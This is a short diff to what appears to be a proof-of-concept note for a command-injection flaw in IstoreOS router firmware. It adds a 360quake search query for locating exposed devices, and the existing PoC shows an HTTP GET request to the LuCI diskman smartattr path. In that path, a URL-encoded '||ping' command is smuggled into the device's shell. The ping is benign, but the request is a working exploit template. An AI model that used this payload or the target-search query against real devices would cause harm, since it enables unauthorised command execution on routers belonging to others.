@@ -1,3 +1,6 @@
+## 360quake
+title:"IstoreOS"
+
 ## poc
 ```C
 GET /cgi-bin/luci/admin/system/diskman/smartattr/%7c%7cping%20www.baidu.com HTTP/1.1
